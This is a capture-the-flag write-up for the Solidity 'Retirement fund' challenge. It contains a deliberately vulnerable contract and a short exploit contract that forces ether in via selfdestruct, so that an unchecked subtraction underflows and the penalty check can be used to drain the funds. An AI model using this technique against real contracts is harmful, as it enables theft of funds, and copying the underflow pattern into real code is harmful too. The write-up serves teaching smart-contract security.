# Retirement fund
<sup>MATH: 500 POINTS</sup>

This retirement fund is what economists call a [commitment device](https://en.wikipedia.org/wiki/Commitment_device). I’m trying to make sure I hold on to 1 ether for retirement.

I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!).

I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!

```solidity
pragma solidity ^0.4.21;

contract RetirementFundChallenge {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = now + 10 years;

    function RetirementFundChallenge(address player) public payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (now < expiration) {
            // early withdrawal incurs a 10% penalty
            msg.sender.transfer(address(this).balance * 9 / 10);
        } else {
            msg.sender.transfer(address(this).balance);
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);

        uint256 withdrawn = startBalance - address(this).balance;

        // an early withdrawal occurred
        require(withdrawn > 0);

        // penalty is what's left
        msg.sender.transfer(address(this).balance);
    }
}
```

Enjoy this inspirational music while you work: [Smooth Criminal](https://www.youtube.com/watch?v=Mx0xCI1jaUM).


Solution:

In order to get the money we need to `collectPenalty`

The condition we need to achieve is `require(withdrawn > 0);`

And this is calculated by `uint256 withdrawn = startBalance - address(this).balance;`

`startBalance`, which is `1`, cannot be manipulated, but we know that `address(this).balance` can

We need to fund the contract with some ETH to get some ETH back. Looks like 2020 twitter scam :D

```solidity
contract Exploit {
    address contractToFund;
    constructor(address _contractToFund) public payable {
        require(msg.value == 1 ether);
        contractToFund = _contractToFund;
    }
    function destroy() public {
        selfdestruct(contractToFund);
    }
}
```